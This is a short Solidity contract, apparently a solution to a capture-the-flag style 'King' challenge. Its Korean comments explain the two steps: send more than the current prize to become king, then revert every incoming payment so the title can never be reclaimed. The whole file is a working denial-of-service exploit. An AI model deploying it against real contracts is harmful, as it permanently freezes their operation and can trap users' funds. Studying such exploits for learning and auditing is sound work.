// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address payable King) payable {
        King.call{value: msg.value}(""); // 1. 현재 prize 보다 더 큰 금액을 보내서 attack 컨트랙트가 king 이 되게
    }

    receive() external payable {
        revert("nope!"); // 2. king 컨트랙트에서 transfer 를 보내면 revert 되게
    }
}
